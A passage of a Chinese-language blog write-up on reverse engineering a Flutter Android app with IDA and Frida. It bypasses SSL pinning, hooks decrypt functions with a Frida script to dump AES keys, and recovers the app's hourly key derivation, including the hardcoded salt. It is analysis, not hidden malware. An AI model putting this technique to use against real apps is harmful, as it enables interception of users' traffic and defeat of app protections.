href="https://github.com/yzctzl/flutter-re-demo/blob/arm32/create_dart_objects.py">create_dart_objects.py</a> 脚本来解析 object pool，解析完成后，可能会有些报红，按照缺少的内存位置导入相应 dump 出来的内存段。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/flutter_object_pool_recover.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/flutter_object_pool_recover.png" class="lazyload" data-srcset="/img/2023/KBLive/flutter_object_pool_recover.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h4 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h4><p>将创建的 struct 与反汇编相关联：<a href="https://github.com/yzctzl/flutter-re-demo/blob/arm32/add_xref_to_dart_objects.py">add_xref_to_dart_objects.py</a>。</p><p>将创建的 struct 与伪代码相关联：在反汇编时 根据 microcode r5.4&#x2F;x27.8 来 Hook，替换为 内存中 Object 位置，相当于把原来的间接访问改为直接访问。脚本在：<a href="https://github.com/yzctzl/flutter-re-demo/blob/arm32/add_dart_objects_in_decompiled_code.py">add_dart_objects_in_decompiled_code.py</a> 中。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/psu_microcode.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/psu_microcode.png" class="lazyload" data-srcset="/img/2023/KBLive/psu_microcode.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>arm 指令集无需修改，但 aarch64 指令集需要，方法简单粗暴：遍历所有指令找到 x15 然后替换为 sp，<a href="https://github.com/yzctzl/flutter-re-demo/blob/arm32/patch_dart_stack_pointer.py">patch_dart_stack_pointer.py</a>。</p><h3 id="传参和返回-ABI"><a href="#传参和返回-ABI" class="headerlink" title="传参和返回(ABI)"></a>传参和返回(ABI)</h3><p>Flutter 的参数传递全部都是通过 <code>sp(r13/x15)/fp</code> 完成的，返回值和通常一样都是 <code>r0</code>；也因为都是在栈上传参的，所以 IDA 无法正确识别参数，可以适当修改函数签名，如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __usercall <span class="title">LocalPuzzles___handlePublishTapped</span><span class="params">(<span class="type">void</span> *context@&lt;^<span class="number">16.8</span>&gt;, <span class="type">void</span> *uuid@&lt;^<span class="number">8.8</span>&gt;, <span class="type">void</span> *user@&lt;^<span class="number">0.8</span>&gt;)</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> __usercall LiveTool__decryptData@&lt;R0&gt;<span class="params">(DartString1 *str@&lt;^<span class="number">0.4</span>&gt;)</span></span></span><br></pre></td></tr></table></figure><p>一个个的修改函数的签名过于麻烦，这里仅需要修改用到的几个关键函数足够了。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>完成上述步骤后，IDA 中的代码其实还没到初步可读的程度，主因是 r10(thr)，很多的函数访问都是通过该寄存器来完成的，其指向的函数大都无法静态追踪。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/r10_problem.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/r10_problem.png" class="lazyload" data-srcset="/img/2023/KBLive/r10_problem.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>执行完如下脚本之后，就完成了原文中的各种静态恢复：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/recent_script.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/recent_script.png" class="lazyload" data-srcset="/img/2023/KBLive/recent_script.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>恢复完的函数名和结构体：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/libapp_recover.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/libapp_recover.png" class="lazyload" data-srcset="/img/2023/KBLive/libapp_recover.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>恢复完的伪代码，效果不佳，其中黄色的 v5 就是 r10：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/dec_data_psu.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/dec_data_psu.png" class="lazyload" data-srcset="/img/2023/KBLive/dec_data_psu.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><h3 id="BoringSSL"><a href="#BoringSSL" class="headerlink" title="BoringSSL"></a>BoringSSL</h3><p>因为 Flutter 使用的并非系统提供的 ssl 库，而是其自带的 BoringSSL 库，所以，通用的系统 vpn 和 proxy 方式不能起效，需要转发全部流量才行，可用 ProxyDroid 或直接用 <a href="https://evilpan.com/2023/01/30/android-iptables/">iptables</a> 来抓包，此外可以尝试基于 ebpf 的流量控制工具。</p><p>针对抓不到包的问题已经有不少文章讨论过了，如：</p><ol><li><a href="https://blog.nviso.eu/2019/08/13/intercepting-traffic-from-android-flutter-applications/">Intercepting traffic from Android Flutter applications</a></li><li><a href="https://blog.nviso.eu/2020/05/20/intercepting-flutter-traffic-on-android-x64/">Intercepting Flutter traffic on Android (ARMv8)</a></li><li><a href="https://blog.nviso.eu/2022/08/18/intercept-flutter-traffic-on-ios-and-android-http-https-dio-pinning/">Intercept Flutter traffic on iOS and Android (HTTP&#x2F;HTTPS&#x2F;Dio Pinning)</a></li></ol><p>这位大佬详细分析了 Android 和 IOS 平台的 Flutter 应用无法抓包的原因以及 hook 位置和抓包方法。</p><p>其对应的源码位于：<a href="https://github.com/google/boringssl/blob/master/ssl/ssl_x509.cc#L357">ssl_crypto_x509_session_verify_cert_chain</a>。</p><p>有两种方式干掉 ssl pinning，一种是想办法识别该函数的特征，然后 hook 掉，另外一种是直接使用魔改的 flutter 库替换原版的 flutter，两种方法分别对应如下：</p><h3 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h3><p>上文作者提供了一个 frida 脚本 <a href="https://github.com/NVISOsecurity/disable-flutter-tls-verification">disable-flutter-tls-verification</a>（原版有个小 bug: <a href="https://gist.github.com/yzctzl/a468b0c2f615dfb607fb44ced43d1d7e">fixed version</a>），提供了相对通用的匹配规则来 hook 该函数。</p><h3 id="reFlutter-1"><a href="#reFlutter-1" class="headerlink" title="reFlutter"></a>reFlutter</h3><p>除了上述方法外，还可以用 reFlutter 重打包，替换掉 libflutter.so，然后配合 BurpSuite 抓包，具体参考：<a href="https://github.com/Impact-I/reFlutter#traffic-interception">Traffic interception</a> 和 <a href="https://l33t-en0ugh.gitbook.io/infosec/android-pentesting/bypass-ssl-pinning-for-flutter-apps-using-reflutter-framework">Bypass SSL Pinning for flutter apps using reFlutter Framework</a>。</p><h3 id="抓包结果"><a href="#抓包结果" class="headerlink" title="抓包结果"></a>抓包结果</h3><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/capture.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/capture.png" class="lazyload" data-srcset="/img/2023/KBLive/capture.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h2 id="frida-1"><a href="#frida-1" class="headerlink" title="frida"></a>frida</h2><p>因为 r10(thr) 的存在，导致静态分析几乎无法解决任何问题，仅仅能够通过重命名后的函数名来猜测关键位置，hook 判断流程。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(hookdecData)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用该函数极易导致崩溃</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Caller</span>(<span class="params">baseAddr, funAddr, context, funame</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">        funame + <span class="string">&quot; Base address: &quot;</span> + baseAddr + <span class="string">&quot; funAddr: &quot;</span> + funAddr + <span class="string">&quot; ==&gt; &quot;</span> +</span><br><span class="line">            <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sp_info</span>(<span class="params">sp</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`sp: <span class="subst">$&#123;sp&#125;</span>: <span class="subst">$&#123;sp.readPointer()&#125;</span>, <span class="subst">$&#123;sp.add(<span class="number">4</span>)&#125;</span>: <span class="subst">$&#123;sp.add(<span class="number">4</span>).readPointer()&#125;</span>, <span class="subst">$&#123;sp.add(<span class="number">8</span>)&#125;</span>: <span class="subst">$&#123;sp.add(<span class="number">8</span>).readPointer()&#125;</span>`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dec_info</span>(<span class="params">sp</span>) &#123;</span><br><span class="line">    <span class="comment">// cid == 0bxx: 获取数据位置 首先 -1 得到 object 起点，然后 +4 得到数据在内存中位置</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sp.<span class="title function_">readPointer</span>()             <span class="comment">// 首先是一个 cid == 0b12</span></span><br><span class="line">                .<span class="title function_">add</span>(-<span class="number">1</span> + <span class="number">4</span>).<span class="title function_">readPointer</span>()    <span class="comment">// 然后 cid == 00bf 存储了 bytes 的指针</span></span><br><span class="line">                .<span class="title function_">add</span>(-<span class="number">1</span> + <span class="number">4</span>).<span class="title function_">readPointer</span>()    <span class="comment">// +4 -1 得到 iv 在内存中位置</span></span><br><span class="line">                .<span class="title function_">readByteArray</span>(<span class="number">16</span>));         <span class="comment">// 从该位置获取长度 16b 的 iv</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sp.<span class="title function_">add</span>(<span class="number">8</span>).<span class="title function_">readPointer</span>()  <span class="comment">// 首先从 栈上读取一个指针，其指向 cid == 0b18</span></span><br><span class="line">                .<span class="title function_">add</span>(-<span class="number">1</span> + <span class="number">4</span>).<span class="title function_">readPointer</span>()  <span class="comment">// cid == 0b11</span></span><br><span class="line">                .<span class="title function_">add</span>(-<span class="number">1</span> + <span class="number">4</span>).<span class="title function_">readPointer</span>()  <span class="comment">// cid == 00bf 存储的是 bytes 的指针</span></span><br><span class="line">                .<span class="title function_">add</span>(-<span class="number">1</span> + <span class="number">4</span>).<span class="title function_">readPointer</span>()  <span class="comment">// +4 -1 得到 key 在内存中位置</span></span><br><span class="line">                .<span class="title function_">readByteArray</span>(<span class="number">32</span>));     <span class="comment">// 从该位置获取长度 32b 的 key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookdecData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> baseAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libapp.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> snapAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libapp.so&#x27;</span>, <span class="string">&#x27;_kDartIsolateSnapshotInstructions&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(baseAddr, snapAddr)</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(snapAddr.<span class="title function_">add</span>(<span class="number">0x35fda0</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  <span class="comment">// 传入一个参数：需要解密的 data 字符串，cid == 0x51</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">r10</span>.<span class="title function_">readByteArray</span>(<span class="number">1024</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;enter decryptData: &quot;</span>, snapAddr.<span class="title function_">add</span>(<span class="number">0x35fda0</span>), <span class="title function_">sp_info</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">sp</span>));</span><br><span class="line">            <span class="comment">// let s_len = this.context.sp.readPointer().add(-1 + 4).readU32() / 2</span></span><br><span class="line">            <span class="comment">// console.log(this.context.sp.readPointer().add(-1).readByteArray(12 + s_len));</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">ret</span>) &#123;</span><br><span class="line">            <span class="comment">// console.log(&quot;leave: decryptData, r0: &quot;, this.context.r0);</span></span><br><span class="line">            <span class="comment">// console.log(this.context.r0.readByteArray(32));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(baseAddr.<span class="title function_">add</span>(<span class="number">0x1e3d88</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="comment">// Caller(baseAddr, baseAddr.add(0x1e3d88), this.context, &quot;Encrypter_decrypt&quot;)</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">r10</span>.<span class="title function_">readByteArray</span>(<span class="number">1024</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;enter Encrypter_decrypt: &quot;</span>, baseAddr.<span class="title function_">add</span>(<span class="number">0x1e3d88</span>), <span class="title function_">sp_info</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">sp</span>));</span><br><span class="line">            <span class="comment">// dec_info(this.context.sp)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(baseAddr.<span class="title function_">add</span>(<span class="number">0x4f16a4</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="comment">// Caller(baseAddr, baseAddr.add(0x4f16a4), this.context, &quot;AES__decrypt&quot;)</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;enter AES__decrypt: &quot;</span>, baseAddr.<span class="title function_">add</span>(<span class="number">0x4f16a4</span>), <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">r12</span>, <span class="title function_">sp_info</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">sp</span>));</span><br><span class="line">            <span class="title function_">dec_info</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">sp</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">ret</span>) &#123;</span><br><span class="line">            <span class="comment">// console.log(&quot;leave: AES__decrypt, r0: &quot;, this.context.r0);</span></span><br><span class="line">            <span class="comment">// let r_len = this.context.r0.add(8-1).readU32() / 2</span></span><br><span class="line">            <span class="comment">// console.log(this.context.r0.add(-1).readByteArray(12 + r_len));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经过不断尝试，初步判断调用流程为：<code>decryptData -&gt; Encrypter_decrypt -&gt; AES__decrypt</code>。</p><p>但很快发现 key 是每小时修改的，但并没有在抓包中发现下发的 key，那么初步推测是本地生成的，此时再用 frida 分析就显得非常无力，本来想使用一些 trace 工具，从中找查找加密方式，但苦于没有顺手的 tracer，最终还是拾起了 IDA，啊，真香！</p><h2 id="IDA-动态调试与分析"><a href="#IDA-动态调试与分析" class="headerlink" title="IDA 动态调试与分析"></a>IDA 动态调试与分析</h2><h3 id="decryptData"><a href="#decryptData" class="headerlink" title="decryptData"></a>decryptData</h3><p>通过上面 frida 的分析，<code>decryptData</code> 函数应该是整个解密的入口，然后再在 <code>Encrypter_decrypt</code> 和 <code>AES__decrypt</code> 加上断点，使用 32 位的 server，attach 上，随便在 App 中点击一下：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_01.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_01.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>成功断下了，然后一路 f8，执行到 下面的位置：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_02.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_02.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>发现之后就进入到 <code>Encrypter_decrypt</code> 中了，那重启调试器，进去看看，很顺利，进入到一个 <code>C47</code> 开头的函数中：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_03.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_03.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>通过查看其传入参数，不包含 key，但在其中调用了 <code>Encrypter_decrypt</code> 其中需要 key 参数，所以 <code>C47</code> 及其调用中必然存在 key 的生成规则。</p><p>下面需要详细分析 C47 这个函数：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_04.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_04.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_05.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_05.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>其首先获取当前 UTC 时间，格式为 <code>%Y%b%#d%#H</code>，然后转为大写，接下来：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_06.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_06.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_07.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_07.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>转为 Uint8List 后每个 byte + 4，这部分在函数内部完成。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_08.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_08.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>这是拼接上 <code>Shinkansen188</code>，然后获取 <code>UserInfo</code>。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_09.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_09.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>上图中是 将拼接后的字符做 MD5。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_10.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_10.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>这里注意 hash 函数包括两种算法，这里用的是 MD5，后面还会用 SHA256。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_11.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_11.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_12.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_12.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>如上，其结果经过三层 object 可见。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_13.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_13.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>接下来把刚才获取到的 UserInfo 中的 token 和 md5 拼接起来。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_14.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_14.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>做 sha256(token + md5)；然后是些无用操作。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_15.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_15.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>其结果保存到了 <code>0xBEF89224</code> 中，以 <code>AB B1</code> 开头，这就是需要的 key</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_18.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_18.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_18.png" 